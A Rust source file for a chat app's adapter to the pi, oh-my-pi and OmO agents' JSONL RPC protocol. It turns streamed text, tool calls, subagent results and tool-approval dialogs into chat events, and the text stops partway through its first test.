//! The pi and oh-my-pi adapter (also OmO): `--mode rpc`, JSONL commands, responses and events (`prompt`, `abort`,
//! `extension_ui_request` dialogs). It turns the RPC stream into the events the chat already draws and keeps the
//! few things only oh-my-pi reports (its todo list and its sub-agent rows) here, so the other adapters stay
//! unaware of them.

use super::*;
use super::subagents::{
    CHOICES,
    Subagents,
    answer_text,
    call_detail,
    input_diff,
    last_line,
    plan_event,
    thinking_event,
    tool_detail,
    tool_kind,
    with_cwd,
};

// ---------------------------------------------------------------------------------------------
// pi and oh-my-pi (`--mode rpc`)
// ---------------------------------------------------------------------------------------------

/// An open pi / oh-my-pi dialog.
enum PiAsk {
    Confirm,
    /// a tool approval oh-my-pi asks as a `select`: the option label for each answer
    Approve { once: String, session: Option<String>, deny: String },
    Select,
    Input,
}

#[derive(Default)]
pub struct Pi {
    cwd: String,
    label: String,
    seq: u64,
    calls: HashMap<String, &'static str>,
    turn: bool,
    streaming: bool,
    msg: u64,
    last_stop: String,
    last_error: String,
    pending: HashMap<String, PiAsk>,
    /// tool calls started and not ended, by call id: (tool name, arguments). An approval dialog names its tool but no
    /// call, so the arguments of that tool's one running call are what Kit's dial reads (`ask_tool::pi_tool`)
    running: HashMap<String, (String, Value)>,
    /// thinking levels it offers (`get_available_thinking_levels`)
    levels: Vec<String>,
    reads: u64,
    waiting: Waiting,
    /// OmO's subagents (`task` tool), by task id once OmO names them (`st_…`), else `<call id>:<n>`
    subs: Subagents,
    /// OmO's task id -> our subagent id; a `task` call id -> its subagents in order
    task_ids: HashMap<String, String>,
    calls_subs: HashMap<String, Vec<String>>,
    /// background work OmO says is still running (`session_lifecycle.waitingOn.background`)
    background: usize,
    /// OmO's own folder (`~/.omo`): its record of each subagent, read when a `task` result names no answer
    omo_home: Option<PathBuf>,
    /// the conversation OmO reported (`get_state`): a subagent record must belong to it
    session: String,
    /// OmO `todo` calls in flight: their list is the turn's checklist, not a step
    todo_calls: std::collections::HashSet<String>,
    /// OmO ended a run with `failure`: the turn's end waits for what OmO says next, a retry of its own
    /// (`auto_retry_start`) or its last word on it (`auto_retry_end`, or the run settling)
    held: bool,
}

/// oh-my-pi's tool approval as a select (`Allow tool: bash\nCommand: ls -la` with Approve / Approve bash for this
/// session / Deny): the tool it names, the card title, the command and the labels, or `None` for an ordinary select.
fn pi_approval(title: &str, options: &[String]) -> Option<(String, String, String, PiAsk)> {
    let mut lines = title.lines();
    let tool = lines.next()?.strip_prefix("Allow tool: ")?.trim().to_string();
    let deny = options.iter().find(|o| o.as_str() == "Deny")?.clone();
    let once = options.iter().find(|o| o.as_str() == "Approve" || o.as_str() == "Approve Once")?.clone();
    let session = options.iter().find(|o| o.ends_with("for this session")).cloned();
    let rest: Vec<&str> = lines.collect();
    let field = |k: &str| rest.iter().find_map(|l| l.strip_prefix(k)).map(|x| x.trim().to_string());
    // a command written on several lines goes on over the dialog's next lines: from its field to the dialog's end, whole
    // (item 117), so no line of it is left off the card
    let from = |k: &str| {
        let i = rest.iter().position(|l| l.starts_with(k))?;
        let mut all = vec![rest[i][k.len()..].trim_start()];
        all.extend(&rest[i + 1..]);
        Some(all.join("\n").trim_end().to_string())
    };
    let (title, command) = match tool_kind(&tool) {
        "terminal" => ("Run this command?".to_string(), from("Command:").or_else(|| from("Code:")).unwrap_or_default()),
        "patch" => {
            let p = field("Path:").or_else(|| field("File:")).unwrap_or_default();
            (if p.is_empty() || p == "(unknown)" { format!("Allow {tool} to change files?") } else { format!("Allow {tool} to change {p}?") }, String::new())
        }
        _ => (format!("Allow {tool}?"), rest.join("\n").trim().to_string()),
    };
    Some((tool, title, command, PiAsk::Approve { once, session, deny }))
}

/// OmO's own folder: `~/.omo`.
fn omo_home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME").or_else(|| std::env::var_os("USERPROFILE")).filter(|h| !h.is_empty()).map(|h| PathBuf::from(h).join(".omo"))
}

/// Seconds since the epoch of an ISO time as OmO writes it (`2026-11-12T15:53:23.423Z`, UTC).
fn iso_secs(t: &str) -> Option<f64> {
    let t = t.strip_suffix('Z')?;
    let (date, time) = t.split_once('T')?;
    let d: Vec<i64> = date.split('-').map(|x| x.parse().ok()).collect::<Option<_>>()?;
    let (hms, frac) = time.split_once('.').unwrap_or((time, "0"));
    let h: Vec<i64> = hms.split(':').map(|x| x.parse().ok()).collect::<Option<_>>()?;
    if d.len() != 3 || h.len() != 3 {
        return None;
    }
    let (y, m) = if d[1] <= 2 { (d[0] - 1, d[1] + 9) } else { (d[0], d[1] - 3) };
    let era = y.div_euclid(400);
    let yoe = y - era * 400;
    let doy = (153 * m + 2) / 5 + d[2] - 1;
    let days = era * 146097 + yoe * 365 + yoe / 4 - yoe / 100 + doy - 719468;
    Some((days * 86400 + h[0] * 3600 + h[1] * 60 + h[2]) as f64 + format!("0.{frac}").parse::<f64>().ok()?)
}

/// OmO's todo list as its `todo` result states it (`details.phases[].tasks[] {content, status}`), in order.
fn omo_todo(d: &Value) -> Option<Vec<(String, String)>> {
    let phases = d.get("phases")?.as_array()?;
    Some(
        phases
            .iter()
            .flat_map(|p| p.get("tasks").and_then(Value::as_array).into_iter().flatten())
            .map(|t| {
                let st = match s(t, "status").as_str() {
                    "in_progress" => "in_progress",
                    "completed" => "completed",
                    _ => "pending",
                };
                (s(t, "content"), st.to_string())
            })
            .collect(),
    )
}

impl Pi {
    pub fn new(cwd: &str, label: &str) -> Pi {
        let agent = match label {
            "OmO" => "omo",
            "oh-my-pi" => "omp",
            _ => "pi",
        };
        let omo_home = if agent == "omo" { omo_home_dir() } else { None };
        Pi { cwd: cwd.into(), label: label.into(), subs: Subagents::new(agent), omo_home, ..Pi::default() }
    }
    /// OmO's own record of subagent `task_id` (`st_…`), read-only: the same `senpi-task/tasks/st_*.json` files the
    /// Plans reader reads (BOUNDARY rule 16), under `<omo>/agent/projects/*/` or this session's own folder's `.omo`,
    /// never through a link, and only a record of this session. `None` when there is none or it does not parse.
    fn omo_record(&self, task_id: &str) -> Option<Value> {
        let ok = task_id.len() <= 67 && task_id.strip_prefix("st_").is_some_and(|r| !r.is_empty() && r.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-'));
        if !ok {
            return None;
        }
        let file = format!("{task_id}.json");
        let mut stores: Vec<PathBuf> = vec![];
        let real_dir = |p: &Path| std::fs::symlink_metadata(p).is_ok_and(|m| m.is_dir());
        if !self.cwd.is_empty() {
            let dot = Path::new(&self.cwd).join(".omo");
            if real_dir(&dot) && real_dir(&dot.join("senpi-task")) {
                stores.push(dot.join("senpi-task").join("tasks"));
            }
        }
        if let Some(root) = self.omo_home.as_ref().map(|h| h.join("agent").join("projects")).filter(|r| real_dir(r)) {
            for e in std::fs::read_dir(&root).ok()?.flatten() {
                if e.file_type().is_ok_and(|t| t.is_dir()) {
                    stores.push(e.path().join("senpi-task").join("tasks"));
                }
            }
        }
        stores.into_iter().filter(|d| real_dir(d)).find_map(|d| {
            let p = d.join(&file);
            let m = std::fs::symlink_metadata(&p).ok()?;
            if !m.is_file() || m.len() > 1 << 20 {
                return None;
            }
            let rec: Value = serde_json::from_str(&std::fs::read_to_string(&p).ok()?).ok()?;
            (s(&rec, "task_id") == task_id && (self.session.is_empty() || s(&rec, "root_session_id") == self.session)).then_some(rec)
        })
    }
    /// A `task` call: one subagent per entry of `tasks` (or the call itself with one task), one fan-out per call.
    fn task_start(&mut self, st: &mut Step, call: &str, args: &Value) {
        let one = [args.clone()];
        let tasks: &[Value] = args.get("tasks").and_then(Value::as_array).map(Vec::as_slice).unwrap_or(&one);
        let kind = s(args, "subagent_type");
        let mut ids = vec![];
        for (i, t) in tasks.iter().enumerate() {
            let id = format!("{call}:{i}");
            let name = [s(t, "name"), s(t, "subagent_type"), kind.clone()].into_iter().find(|x| !x.is_empty()).unwrap_or_default();
            let goal = [s(t, "task_summary"), s(t, "description"), s(t, "prompt")].into_iter().find(|x| !x.is_empty()).unwrap_or_default();
            self.subs.add(&id, &format!("pi-{call}"), &name, &goal, "");
            st.events.extend(self.subs.event(&id, "queued", json!({})));
            ids.push(id);
        }
        self.calls_subs.insert(call.to_string(), ids);
    }
    /// The `task` call's result names each subagent's task id, model and state (a background one runs on).
    fn task_end(&mut self, st: &mut Step, call: &str, v: &Value) {
        let Some(ids) = self.calls_subs.remove(call) else { return };
        let d = &v["result"]["details"];
        let one = [d.clone()];
        let items: &[Value] = d.get("items").and_then(Value::as_array).map(Vec::as_slice).unwrap_or(&one);
        let failed = v.get("isError").and_then(Value::as_bool).unwrap_or(false);
        for (i, id) in ids.iter().enumerate() {
            let it = items.get(i).cloned().unwrap_or(Value::Null);
            let tid = s(&it, "task_id");
            if !tid.is_empty() {
                self.task_ids.insert(tid, id.clone());
            }
            let status = s(&it, "status");
            // a foreground result (OmO 5.1.56) names no answer: OmO's own record of that task id has it, with the
            // model it ran on and its times, as Plans reads them
            let own = if status == "completed" { "final_response" } else { "error" };
            let rec = if !failed && matches!(status.as_str(), "completed" | "failed" | "error") && s(&it, own).is_empty() { self.omo_record(&s(&it, "task_id")) } else { None };
            let rec = rec.filter(|r| s(r, "status") == status);
            let mut model = it.get("resolved_model").map(|m| s(m, "model_id")).unwrap_or_default();
            let mut secs = None;
            if let Some(r) = &rec {
                let m = r.get("effective_model").map(|m| s(m, "model_id")).filter(|m| !m.is_empty()).unwrap_or_else(|| s(r, "model"));
                if !m.is_empty() {
                    model = m.rsplit('/').next().unwrap_or(&m).to_string();
                }
                if let (Some(a), Some(b)) = (iso_secs(&s(r, "started_at")), iso_secs(&s(r, "terminal_at"))) {
                    secs = (b >= a).then_some(b - a);
                }
            }
            if let Some(x) = self.subs.subs.get_mut(id) {
                if !model.is_empty() {
                    x.model = model;
                }
            }
            let answer = |k: &str| if s(&it, k).is_empty() { rec.as_ref().map(|r| s(r, k)).unwrap_or_default() } else { s(&it, k) };
            match status.as_str() {
                _ if failed => {
                    let e = v["result"]["content"].as_array().and_then(|a| a.first()).map(|b| s(b, "text")).unwrap_or_default();
                    self.subs.end(st, id, "failed", if e.is_empty() { "failed" } else { &e }, None)
                }
                "completed" => self.subs.end(st, id, "done", &answer("final_response"), secs),
                "failed" | "error" => {
                    let e = answer("error");
                    self.subs.end(st, id, "failed", if e.is_empty() { "failed" } else { &e }, secs)
                }
                "cancelled" | "aborted" => self.subs.end(st, id, "cancelled", "", None),
                _ => st.events.extend(self.subs.event(id, "running", json!({}))),
            }
        }
    }
    /// OmO's notice that a background subagent finished (`senpi-task.completion` in a wake message's details).
    fn task_done(&mut self, st: &mut Step, m: &Value) {
        for p in m["details"].get("producerDetails").and_then(Value::as_array).into_iter().flatten() {
            if s(p, "customType") != "senpi-task.completion" {
                continue;
            }
            for d in p.get("details").and_then(Value::as_array).into_iter().flatten() {
                let Some(id) = self.task_ids.get(&s(d, "task_id")).cloned() else { continue };
                let model = s(d, "model");
                if let Some(x) = self.subs.subs.get_mut(&id) {
                    if !model.is_empty() {
                        x.model = model.rsplit('/').next().unwrap_or(&model).to_string();
                    }
                }
                let secs = d.get("duration_ms").and_then(Value::as_u64).map(|ms| ms as f64 / 1000.0);
                let state = match s(d, "status").as_str() {
                    "completed" => "done",
                    "cancelled" | "aborted" => "cancelled",
                    _ => "failed",
                };
                let answer = if state == "failed" { s(d, "error") } else { s(d, "final_response") };
                self.subs.end(st, &id, state, if state == "failed" && answer.is_empty() { "failed" } else { &answer }, secs);
            }
        }
    }
    fn cmd(&mut self, st: &mut Step, kind: &'static str, fields: Value) {
        self.seq += 1;
        let id = format!("manut-{}", self.seq);
        self.send_cmd(st, kind, id, fields);
    }
    /// A read on the side (levels, commands, usage): its own ids, so the person's commands keep theirs.
    fn read(&mut self, st: &mut Step, kind: &'static str) {
        self.reads += 1;
        let id = format!("manut-r{}", self.reads);
        self.send_cmd(st, kind, id, json!({}));
    }
    fn send_cmd(&mut self, st: &mut Step, kind: &'static str, id: String, mut fields: Value) {
        self.calls.insert(id.clone(), kind);
        fields["id"] = Value::String(id);
        fields["type"] = Value::String(kind.into());
        st.out(fields);
    }
    fn end(&mut self, st: &mut Step) {
        self.held = false;
        if self.turn {
            self.turn = false;
            self.streaming = false;
            self.pending.clear();
            // a run takes its follow-ups before it ends; what is left was cleared by Stop
            self.waiting.all_dropped(st);
            // how full the context is now
            self.read(st, "get_session_stats");
            let (outcome, err) = match self.last_stop.as_str() {
                "aborted" => ("interrupted", String::new()),
                "error" => ("error", self.last_error.clone()),
                _ => ("done", String::new()),
            };
            let mut f = json!({"outcome": outcome});
            if !err.is_empty() {
                f["error"] = Value::String(self.friendly(&err));
            }
            st.emit(ev("turn.end", f));
        }
        self.last_stop.clear();
        self.last_error.clear();
    }
    /// A calm line for an error: a missing login names where to sign in, a provider's raw reply
    /// (`400 {"type":"error","error":{"message":…}}`) its message, anything else its first line.
    fn friendly(&self, err: &str) -> String {
        let who = if self.label.is_empty() { "pi" } else { &self.label };
        if err.contains("No API key") || err.contains("/login") || err.contains("No default model") {
            return format!("{who} is not signed in. Open Terminal and run /login, then Restart.");
        }
        let line = last_line(err);
        clip(&provider_message(line).unwrap_or_else(|| line.to_string()), 200)
    }
    /// What OmO said after a run that ended with `failure`, while its end waits (`held`). True when the line was
    /// taken here (a retry starts, or its last word ends the turn).
    fn after_failure(&mut self, st: &mut Step, v: &Value) -> bool {
        match s(v, "type").as_str() {
            // OmO tries again by itself: the same turn goes on, and its line says which try this is
            "auto_retry_start" => {
                self.held = false;
                self.last_stop.clear();
                self.last_error.clear();
                let n = v.get("attempt").and_then(Value::as_u64).unwrap_or(1);
                let max = v.get("maxAttempts").and_then(Value::as_u64).unwrap_or(0);
                st.emit(ev("status", json!({"text": format!("Retrying {n} of {max}"), "retry": {"attempt": n, "max": max}})));
                true
            }
            // the retries are over: the turn ends once, with OmO's own words for why
            "auto_retry_end" => {
                self.held = false;
                let why = s(v, "finalError");
                if v.get("success").and_then(Value::as_bool) != Some(true) && !why.is_empty() {
                    self.last_stop = "error".into();
                    self.last_error = why;
                }
                self.end(st);
                true
            }
            // no retry came: the run settled (or the next one starts) on that failure
            "agent_settled" | "agent_idle" | "agent_start" | "model_config_error" | "prompt_result" => {
                self.held = false;
                self.end(st);
                false
            }
            _ => false,
        }
    }
}

/// The message of a provider's raw error reply, `400 {"type":"error","error":{"message":"…"}}`.
fn provider_message(line: &str) -> Option<String> {
    let body: Value = serde_json::from_str(line[line.find('{')?..].trim()).ok()?;
    let m = body.get("error").map(|e| if e.is_string() { e.as_str().unwrap_or_default().to_string() } else { s(e, "message") }).unwrap_or_else(|| s(&body, "message"));
    (!m.trim().is_empty()).then_some(m)
}

/// `session.usage` from an rpc `contextUsage` (`{tokens, contextWindow}`), when it has both.
fn pi_usage(u: &Value) -> Option<Event> {
    let used = u.get("tokens").and_then(Value::as_u64)?;
    let max = u.get("contextWindow").and_then(Value::as_u64).filter(|m| *m > 0)?;
    Some(ev("session.usage", json!({"used": used, "max": max})))
}

/// `session.commands` from an rpc command list: slash commands and prompts as `/name`, skills as `$skill:name`.
fn pi_commands(d: &Value) -> Event {
    let commands: Vec<Value> = d
        .get("commands")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|c| !s(c, "name").is_empty())
        .map(|c| {
            let skill = s(c, "source") == "skill";
            let prefix = if s(c, "syntax") == "dollar" { "$" } else { "/" };
            command_entry(&s(c, "name"), &s(c, "description"), "", if skill { "skill" } else { "command" }, prefix)
        })
        .collect();
    ev("session.commands", json!({"commands": commands}))
}

fn pi_model(m: &Value) -> Value {
    let provider = s(m, "provider");
    let id = s(m, "id");
    let name = if s(m, "name").is_empty() { id.clone() } else { s(m, "name") };
    json!({"id": format!("{provider}/{id}"), "label": name, "detail": provider})
}

impl Adapter for Pi {
    fn explain(&self, err: &str) -> String {
        self.friendly(err)
    }

    fn name(&self) -> &str {
        if self.label.is_empty() {
            "pi"
        } else {
            &self.label
        }
    }

    fn start(&mut self) -> Step {
        let mut st = Step::default();
        self.cmd(&mut st, "get_state", json!({}));
        self.cmd(&mut st, "get_available_models", json!({}));
        self.read(&mut st, "get_available_thinking_levels");
        self.read(&mut st, "get_commands");
        st
    }

    fn in_turn(&self) -> bool {
        self.turn
    }

    fn on_line(&mut self, line: &str) -> Step {
        let mut st = Step::default();
        let Ok(v) = serde_json::from_str::<Value>(line) else { return st };
        if self.held && self.after_failure(&mut st, &v) {
            return st;
        }
        match s(&v, "type").as_str() {
            "response" => {
                let what = self.calls.remove(&s(&v, "id")).unwrap_or("");
                let ok = v.get("success").and_then(Value::as_bool).unwrap_or(false);
                let d = &v["data"];
                if !ok {
                    let e = s(&v, "error");
                    if what == "prompt" {
                        self.last_stop = "error".into();
                        self.last_error = e;
                        self.end(&mut st);
                    } else if !what.is_empty() && !matches!(what, "get_available_thinking_levels" | "get_commands" | "get_session_stats") {
                        // (an agent without those reads simply has no levels, commands or usage)
                        st.emit(ev("session.error", json!({"message": format!("{}: {}", s(&v, "command"), self.friendly(&e))})));
                    }
                    return st;
                }
                match what {
                    "get_state" => {
                        let model = d.get("model").map(|m| s(m, "name")).filter(|n| !n.is_empty() && n != "unknown").or_else(|| d.get("model").map(|m| s(m, "id")).filter(|n| n != "unknown")).unwrap_or_default();
                        self.session = s(d, "sessionId");
                        let mut f = json!({"agent_session": s(d, "sessionId"), "model": model});
                        let level = s(d, "thinkingLevel");
                        if !level.is_empty() {
                            f["effort"] = Value::String(level);
                        }
                        st.emit(ev("session.info", f));
                        if let Some(u) = pi_usage(&d["contextUsage"]) {
                            st.emit(u);
                        }
                    }
                    "get_available_thinking_levels" => {
                        self.levels = d.get("levels").and_then(Value::as_array).into_iter().flatten().filter_map(|l| l.as_str().map(String::from)).collect();
                        if !self.levels.is_empty() {
                            st.emit(ev("session.efforts", json!({"levels": self.levels})));
                        }
                    }
                    "get_commands" => st.emit(pi_commands(d)),
                    "get_session_stats" => {
                        if let Some(u) = pi_usage(&d["contextUsage"]) {
                            st.emit(u);
                        }
                    }
                    "get_available_models" => {
                        let options: Vec<Value> = d.get("models").and_then(Value::as_array).into_iter().flatten().map(pi_model).collect();
                        st.emit(ev("session.models", json!({"options": options})));
                    }
                    "set_model" => {
                        let label = pi_model(d)["label"].clone();
                        st.emit(ev("session.info", json!({"model": label})));
                    }
                    "prompt" => {
                        if s(d, "disposition") == "handled" {
                            self.end(&mut st);
                        }
                    }
                    _ => {}
                }
            }
            "agent_start" => {
                self.streaming = true;
                if !self.turn {
                    self.turn = true;
                    st.emit(ev("turn.start", json!({})));
                }
            }
            "message_update" => {
                let e = &v["assistantMessageEvent"];
                match s(e, "type").as_str() {
                    "text_delta" => {
                        let t = s(e, "delta");
                        if !t.is_empty() {
                            st.emit(ev("delta", json!({"text": t})));
                        }
                    }
                    "thinking_delta" => st.emit(thinking_event(&s(e, "delta"))),
                    "thinking_start" => st.emit(thinking_event("")),
                    _ => {}
                }
            }
            // the agent took the person's message (a follow-up leaves its queue here)
            "message_end" if s(&v["message"], "role") == "user" => {
                self.waiting.take(&mut st);
            }
            "thinking_level_changed" => st.emit(ev("session.info", json!({"effort": s(&v, "level")}))),
            "commands_changed" => st.emit(pi_commands(&v)),
            "message_start" if s(&v["message"], "role") == "custom" => {
                let m = v["message"].clone();
                self.task_done(&mut st, &m);
            }
            "message_end" => {
                let m = &v["message"];
                if s(m, "role") == "assistant" {
                    self.last_stop = s(m, "stopReason");
                    self.last_error = s(m, "errorMessage");
                    let text: String = match m.get("content") {
                        Some(Value::String(t)) => t.clone(),
                        Some(Value::Array(a)) => a.iter().filter(|b| s(b, "type") == "text").map(|b| s(b, "text")).collect::<Vec<_>>().join(""),
                        _ => String::new(),
                    };
                    if !text.trim().is_empty() {
                        self.msg += 1;
                        st.emit(ev("message", json!({"id": format!("pi-m{}", self.msg), "text": text})));
                    }
                }
            }
            "tool_execution_start" => {
                let name = s(&v, "toolName");
                let args = v.get("args").cloned().unwrap_or(Value::Null);
                let call = s(&v, "toolCallId");
                self.running.insert(call.clone(), (name.clone(), args.clone()));
                if name == "todo" && self.label == "OmO" {
                    // OmO's todo list: the turn's checklist once its result says how the list stands, never a step
                    self.todo_calls.insert(call);
                } else if name == "task" {
                    // the step names its subagents, never the call's raw JSON; each one gets its own row
                    let names: Vec<String> = args.get("tasks").and_then(Value::as_array).into_iter().flatten().map(|t| s(t, "name")).filter(|n| !n.is_empty()).collect();
                    let detail = if names.is_empty() { tool_detail(&args) } else { names.join(", ") };
                    st.emit(ev("tool.start", json!({"tool_id": call, "name": "delegate_task", "detail": clip(&detail, 160)})));
                    self.task_start(&mut st, &call, &args);
                } else {
                    st.emit(ev("tool.start", json!({"tool_id": call, "name": tool_kind(&name), "detail": call_detail(&name, &args, &self.cwd)})));
                    // pi's write / edit name the text they change: the diff view shows it
                    if let Some(f) = input_diff(&name, &args, &self.cwd) {
                        st.emit(ev("tool.diff", json!({"tool_id": call, "files": [f]})));
                    }
                }
            }
            "tool_execution_end" => {
                let ok = !v.get("isError").and_then(Value::as_bool).unwrap_or(false);
                let call = s(&v, "toolCallId");
                self.running.remove(&call);
                if self.todo_calls.remove(&call) {
                    if let Some(items) = omo_todo(&v["result"]["details"]) {
                        st.emit(plan_event(&items));
                    }
                    return st;
                }
                st.emit(ev("tool.end", json!({"tool_id": call, "name": "", "ok": ok, "ms": 0})));
                self.task_end(&mut st, &call, &v);
            }
            // what still runs after the turn: background commands (subagents have their own rows)
            "session_lifecycle" => {
                let w = &v["lifecycle"]["waitingOn"];
                let n: usize = w.get("background").and_then(Value::as_array).into_iter().flatten()
                    .filter(|b| !s(b, "source").starts_with("delivery:"))
                    .map(|b| b.get("activeCount").and_then(Value::as_u64).unwrap_or(1) as usize).sum();
                if n != self.background {
                    self.background = n;
                    st.emit(ev("session.info", json!({"background": n})));
                }
            }
            // Both end a run with agent_end. oh-my-pi then adds prompt_result and session_settled, which can arrive
            // after the person's next prompt was sent, so they never end a turn, except a prompt no agent ran for.
            "agent_end" => {
                // a Stop that hit a running tool leaves the last message at stopReason "toolUse": agent_end itself
                // says the run was aborted
                if v.get("aborted").and_then(Value::as_bool) == Some(true) {
                    self.last_stop = "aborted".into();
                } else if self.turn && v.get("failure").is_some_and(Value::is_object) {
                    // OmO may retry this by itself (`auto_retry_start` comes after agent_end, whatever its
                    // `willRetry` says): one message stays one turn until OmO says how it went
                    self.held = true;
                    return st;
                }
                self.end(&mut st)
            }
            "prompt_result" if v.get("agentInvoked").and_then(Value::as_bool) == Some(false) => self.end(&mut st),
            // OmO's own retry worked (it says so before that run's agent_end): the line stops saying it retries
            "auto_retry_end" if self.turn && v.get("success").and_then(Value::as_bool) == Some(true) => {
                st.emit(ev("status", json!({"text": ""})));
            }
            "extension_ui_request" => {
                let id = s(&v, "id");
                let method = s(&v, "method");
                let title = s(&v, "title");
                match method.as_str() {
                    "confirm" => {
                        let msg = s(&v, "message");
                        self.pending.insert(id.clone(), PiAsk::Confirm);
                        // an extension's own question, not a tool call: Kit's dial leaves it to the person
                        let tool = ask_tool("other", "", None, None, &self.cwd);
                        st.emit(ev("approval.request", with_cwd(json!({"request_id": id, "title": if title.is_empty() { "Allow this?".into() } else { title }, "command": msg, "choices": ["deny", "once"], "tool": tool}), &self.cwd)));
                    }
                    "select" => {
                        let options: Vec<String> = v.get("options").and_then(Value::as_array).into_iter().flatten().filter_map(|o| o.as_str().map(String::from)).collect();
                        if let Some((name, t, command, ask)) = pi_approval(&title, &options) {
                            let choices: Vec<&str> = if matches!(&ask, PiAsk::Approve { session: Some(_), .. }) { CHOICES.to_vec() } else { vec!["deny", "once"] };
                            self.pending.insert(id.clone(), ask);
                            // the dialog's "Command:" is pi's words, from that line to its end; the dial and the card
                            // read the running call's own arguments, when exactly one call of that tool is running
                            let mut calls = self.running.values().filter(|(n, _)| *n == name);
                            let args = match (calls.next(), calls.next()) {
                                (Some((_, a)), None) => Some(a),
                                _ => None,
                            };
                            let own = args.and_then(|a| a.get("command")).and_then(Value::as_str).filter(|c| !c.trim().is_empty());
                            let command = match own {
                                Some(c) if tool_kind(&name) == "terminal" => c.to_string(),
                                _ => command,
                            };
                            let tool = pi_tool(&name, args, &self.cwd);
                            st.emit(ev("approval.request", with_cwd(json!({"request_id": id, "title": t, "command": command, "choices": choices, "tool": tool}), &self.cwd)));
                        } else {
                            self.pending.insert(id.clone(), PiAsk::Select);
                            st.emit(ev("clarify.request", json!({"request_id": id, "question": title, "choices": options})));
                        }
                    }
                    "input" => {
                        self.pending.insert(id.clone(), PiAsk::Input);
                        st.emit(ev("clarify.request", json!({"request_id": id, "question": title})));
                    }
                    "editor" => st.out(json!({"type": "extension_ui_response", "id": id, "cancelled": true})),
                    // oh-my-pi closes a dialog it opened (its own timeout)
                    "cancel" => {
                        let target = s(&v, "targetId");
                        if self.pending.remove(&target).is_some() {
                            st.emit(ev("prompt.expired", json!({"request_id": target, "reason": "timeout"})));
                        }
                    }
                    // OmO sets its own statuses (memory, goal, web search) after agent_end too: those are not a turn
                    "setStatus" => {
                        let t = s(&v, "statusText");
                        if !t.is_empty() && self.turn {
                            st.emit(ev("status", json!({"text": clip(&t, 120)})));
                        }
                    }
                    _ => {}
                }
            }
            _ => {}
        }
        st
    }

    fn on_input(&mut self, input: Input) -> Result<Step, String> {
        let mut st = Step::default();
        match input {
            Input::Send { text, images, id } => {
                self.waiting.push(&mut st, id, self.streaming);
                let mut f = json!({"message": text});
                // pictures as the rpc prompt's own `images` (ImageContent: base64 data and its type)
                if !images.is_empty() {
                    f["images"] = images.iter().map(|p| json!({"type": "image", "data": p.data, "mimeType": p.mime})).collect();
                }
                if self.streaming {
                    f["streamingBehavior"] = Value::String("followUp".into());
                }
                if !self.turn {
                    self.turn = true;
                    st.emit(ev("turn.start", json!({})));
                }
                self.cmd(&mut st, "prompt", f);
            }
            Input::Interrupt => self.cmd(&mut st, "abort", json!({})),
            // pi's rpc `steer` (pi, oh-my-pi and OmO's senpi docs/rpc.md): delivered after the running tool calls,
            // before the next model call
            Input::Steer { id, text } => {
                if !self.streaming {
                    return Err("nothing is running to steer".into());
                }
                self.waiting.steer(id);
                self.cmd(&mut st, "steer", json!({"message": text}));
            }
            Input::Approve { request_id, choice } => {
                let ask = self.pending.remove(&request_id).ok_or("no such request")?;
                let out = match (&ask, choice.as_str()) {
                    (PiAsk::Confirm, "deny") => json!({"confirmed": false}),
                    (PiAsk::Confirm, "once" | "session") => json!({"confirmed": true}),
                    (PiAsk::Approve { deny, .. }, "deny") => json!({"value": deny}),
                    (PiAsk::Approve { once, .. }, "once") => json!({"value": once}),
                    (PiAsk::Approve { session: Some(s), .. }, "session") => json!({"value": s}),
                    (PiAsk::Select | PiAsk::Input, _) => {
                        self.pending.insert(request_id, ask);
                        return Err("not an approval".into());
                    }
                    (_, other) => {
                        self.pending.insert(request_id, ask);
                        return Err(format!("unknown choice {other}"));
                    }
                };
                let mut out = out;
                out["type"] = Value::String("extension_ui_response".into());
                out["id"] = Value::String(request_id);
                st.out(out);
            }
            Input::Clarify { request_id, answer } => {
                let ask = self.pending.remove(&request_id).ok_or("no such request")?;
                if matches!(ask, PiAsk::Confirm | PiAsk::Approve { .. }) {
                    self.pending.insert(request_id, ask);
                    return Err("not a question".into());
                }
                st.out(json!({"type": "extension_ui_response", "id": request_id, "value": answer_text(&answer)}));
            }
            Input::Model { model } => {
                let (provider, id) = model.split_once('/').ok_or("model must be provider/id")?;
                self.cmd(&mut st, "set_model", json!({"provider": provider, "modelId": id}));
                self.read(&mut st, "get_available_thinking_levels");
            }
            Input::Mode { mode } => return Err(format!("{} has no permission mode here ({mode})", self.label)),
            Input::Rewind | Input::RewindTo { .. } => return Err(format!("{} cannot take a message back here", self.label)),
            Input::Effort { effort } => {
                if !self.levels.contains(&effort) {
                    return Err(format!("unknown thinking level {effort}"));
                }
                self.cmd(&mut st, "set_thinking_level", json!({"level": effort}));
            }
        }
        Ok(st)
    }
}

/// The OmO records recorded with the omo-13 streams (never the person's own `~/.omo`).
#[cfg(test)]
pub(super) fn fixture_omo_home() -> Option<PathBuf> {
    Some(Path::new(env!("CARGO_MANIFEST_DIR")).join("tests").join("fixtures").join("omo-home"))
}

#[cfg(test)]
pub(super) fn omo_pi() -> Pi {
    Pi { omo_home: fixture_omo_home(), ..Pi::new("/w/proj", "OmO") }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent_chat::subagents::DIFF_LINES;
    use crate::agent_chat::tests::{
        ask_tools,
        ends,
        fixture,
        names,
        of,
        pi_up,
        real,
        replay,
        run,
        sent_with,
        steer,
        text_of,
        tools,
        with_pic,
        written,
    };

    // ---- pi / oh-my-pi `--mode rpc` (fixture from pi-mono docs/rpc*.md, docs/json.md) -------------

    #[test]
    fn pi_prompt_streams_tools_and_settles() {
        let mut p = Pi::default();
        let st = p.start();
        let w: Vec<Value> = st.write.iter().map(|l| serde_json::from_str(l).unwrap()).collect();
        assert_eq!((s(&w[0], "type"), s(&w[1], "type")), ("get_state".into(), "get_available_models".into()));
        let st = p.on_input(Input::send("list the ts files")).unwrap();
        let cmd: Value = serde_json::from_str(&st.write[0]).unwrap();
        assert_eq!((s(&cmd, "type"), s(&cmd, "message")), ("prompt".into(), "list the ts files".into()));
        assert_eq!(names(&st.events), ["turn.start"]);
        let st = run(&mut p, &fixture("pi-turn.jsonl"));
        assert_eq!(s(&st.events[0], "model"), "Claude Sonnet 4");
        assert_eq!(st.events[1]["options"][0]["id"], "anthropic/claude-sonnet-4-20250514");
        let tool = st.events.iter().find(|e| s(e, "event") == "tool.start").unwrap();
        assert_eq!((s(tool, "name"), s(tool, "detail")), ("terminal".into(), "ls src/*.ts".into()));
        assert_eq!(text_of(&st.events, "delta").concat(), "Two files: a.ts and b.ts.");
